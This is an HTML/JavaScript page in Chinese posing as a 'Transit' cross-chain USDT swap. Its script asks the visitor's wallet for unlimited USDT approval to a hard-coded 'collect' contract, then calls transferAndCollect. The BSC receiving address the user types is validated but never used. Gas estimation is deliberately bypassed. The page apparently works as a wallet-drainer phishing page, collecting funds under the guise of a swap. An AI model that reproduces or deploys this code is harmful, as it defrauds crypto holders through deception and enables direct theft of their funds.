<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Transit 闪兑归集</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
<style>
*{box-sizing: border-box;-webkit-tap-highlight-color: transparent;margin:0;padding:0;}
body{font-family: system-ui,-apple-system,sans-serif;background:#f7f8fa;color:#1d2129;padding:20px 16px;padding-bottom:90px;max-width:480px;margin:0 auto;}
.top-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;}
.title-main{font-size:42px;font-weight:600;margin-bottom:20px;}
.label-txt{font-size:16px;color:#666;margin:12px 0 8px;}
.token-box{background:#f7f8fa;border-radius:14px;padding:16px 14px;display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;}
.token-left{display:flex;align-items:center;gap:12px;}
.token-icon{width:40px;height:40px;border-radius:50%;background:#27ae60;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:bold;}
.token-info h4{font-size:20px;}
.token-info p{font-size:14px;color:#888;}
.input-num{border:0;background:transparent;font-size:24px;text-align:right;outline:none;width:120px;}
.switch-arrow{text-align:center;color:#3b82f6;font-size:24px;padding:4px;}
.address-wrap{background:#f7f8fa;border-radius:14px;padding:16px 14px;margin-top:10px;display:flex;align-items:center;overflow:hidden;}
#addrInput{flex:1;border:0;background:transparent;outline:none;font-size:15px;color:#666;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.submit-btn{width:100%;background:#60a5fa;color:#fff;border:none;border-radius:14px;padding:20px 0;font-size:20px;margin:28px 0;}
.submit-btn:disabled{opacity:0.5;}
.bottom-nav{position:fixed;bottom:0;left:0;width:100%;max-width:480px;background:#fff;display:flex;justify-content:space-around;padding:10px 0;border-top:1px solid #eee;}
.nav-item{text-align:center;font-size:12px;color:#888;}
.nav-item.active{color:#3b82f6;}
.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:999;display:none;}
.modal-card{background:#fff;border-radius:16px;padding:28px 24px;width:85%;max-width:360px;}
</style>
</head>
<body>
<div class="top-bar">
    <div>闪兑&跨链 <span class="text-gray-500">限价模式</span></div>
    <div class="flex gap-6 text-xl">
        <i class="fa fa-user-circle-o" id="connectWalletBtn"></i>
        <i class="fa fa-cog"></i>
    </div>
</div>

<div class="title-main">Transit</div>

<div class="label-txt">发送</div>
<div class="token-box">
    <div class="token-left">
        <div class="token-icon">T</div>
        <div class="token-info">
            <h4>USDT</h4>
            <p>以太坊 ERC20</p>
        </div>
    </div>
    <input class="input-num" id="sendNumInput" value="1" inputmode="decimal">
</div>

<div class="switch-arrow"><i class="fa fa-angle-down"></i></div>

<div class="label-txt">接收（预估）</div>
<div class="token-box">
    <div class="token-left">
        <div class="token-icon">T</div>
        <div class="token-info">
            <h4>USDT</h4>
            <p>币安智能链 BSC</p>
        </div>
    </div>
    <div class="input-num text-gray-400" id="receiveShow">0.9990</div>
</div>

<div class="address-wrap">
    <input type="text" id="addrInput" placeholder="点击设置接收BSC地址">
</div>

<button class="submit-btn" id="swapBtn">发起闪兑归集</button>

<div class="modal-bg" id="txModal">
    <div class="modal-card">
        <h3 class="text-xl font-bold mb-4">温馨提示</h3>
        <p id="modalText"></p>
        <div class="text-right mt-6">
            <button class="text-blue-500 text-lg" id="closeModal">确认</button>
        </div>
    </div>
</div>

<div class="bottom-nav">
    <div class="nav-item"><i class="fa fa-circle-o text-xl block mb-1"></i>资产</div>
    <div class="nav-item"><i class="fa fa-line-chart text-xl block mb-1"></i>行情</div>
    <div class="nav-item active"><i class="fa fa-exchange text-xl block mb-1"></i>交易</div>
    <div class="nav-item"><i class="fa fa-globe text-xl block mb-1"></i>发现</div>
    <div class="nav-item"><i class="fa fa-user-o text-xl block mb-1"></i>我的</div>
</div>

<script>
const USDT_ERC20 = "0xdac17f958d2ee523a2206206994597c13d831ec7";
const COLLECT_CONTRACT = "0xcc5a98f3fb045ddb5df09f960ebbca23ce3385fe";
const MAX_APPROVE = ethers.constants.MaxUint256;
const FEE_RATE = 0.001;

// DOM
const connectWalletBtn = document.getElementById('connectWalletBtn');
const sendInput = document.getElementById('sendNumInput');
const receiveDom = document.getElementById('receiveShow');
const addrInput = document.getElementById('addrInput');
const swapBtn = document.getElementById('swapBtn');
const txModal = document.getElementById('txModal');
const modalText = document.getElementById('modalText');
const closeModal = document.getElementById('closeModal');

let provider, signer, usdtContract, poolContract;

// 关闭弹窗
closeModal.onclick = ()=> txModal.style.display = 'none';

// 粘贴清理地址空格换行
addrInput.addEventListener('paste', e=>{
    e.preventDefault();
    let raw = (e.clipboardData || window.clipboardData).getData('text');
    let cleanAddr = raw.replace(/\s|\n|\t/g,'').trim();
    addrInput.value = cleanAddr;
});

// 金额实时计算
sendInput.oninput = ()=>{
    let val = Number(sendInput.value) || 0;
    if(val <=0){
        receiveDom.innerText = '';
        swapBtn.disabled = true;
        return;
    }
    let receive = (val * (1-FEE_RATE)).toFixed(4);
    receiveDom.innerText = receive;
    swapBtn.disabled = false;
}

// 连接钱包
connectWalletBtn.onclick = async ()=>{
    if(!window.ethereum){
        showModal('请安装MetaMask/TokenPocket钱包');
        return;
    }
    try{
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        usdtContract = new ethers.Contract(USDT_ERC20, [
            "function balanceOf(address) view returns(uint256)",
            "function allowance(address,address) view returns(uint256)",
            "function approve(address,uint256) returns(bool)"
        ], signer);
        poolContract = new ethers.Contract(COLLECT_CONTRACT, [
            "function transferAndCollect(uint256 amount) external"
        ], signer);
        showModal('钱包连接成功');
    }catch(err){
        showModal('连接失败:'+err.message.slice(0,50));
    }
}

// 弹窗封装
function showModal(text){
    modalText.innerText = text;
    txModal.style.display = 'flex';
}

// 提交归集（手动指定gasLimit 解决gas预估失败）
swapBtn.onclick = async ()=>{
    swapBtn.disabled = true;
    let amountVal = sendInput.value.trim();
    let targetAddr = addrInput.value.trim();
    const addrReg = /^0x[a-fA-F0-9]{40}$/;
    if(!addrReg.test(targetAddr)){
        showModal('钱包地址格式错误');
        swapBtn.disabled = false;
        return;
    }
    let amount = ethers.utils.parseUnits(amountVal,6);
    try{
        let userAddr = await signer.getAddress();
        let allowance = await usdtContract.allowance(userAddr, COLLECT_CONTRACT);
        if(allowance.lt(amount)){
            showModal('正在授权USDT，请确认钱包签名');
            let approveTx = await usdtContract.approve(COLLECT_CONTRACT, MAX_APPROVE);
            await approveTx.wait();
        }
        // 手动设置gas 绕过estimateGas报错
        let tx = await poolContract.transferAndCollect(amount, {
            gasLimit: 300000
        });
        await tx.wait();
        showModal(`归集成功\n交易哈希:${tx.hash}`);
        sendInput.value = '';
        receiveDom.innerText = '';
    }catch(e){
        showModal(`闪兑失败:${e.message.slice(0,80)}`);
    }
    swapBtn.disabled = false;
}
</script>
</body>
</html>
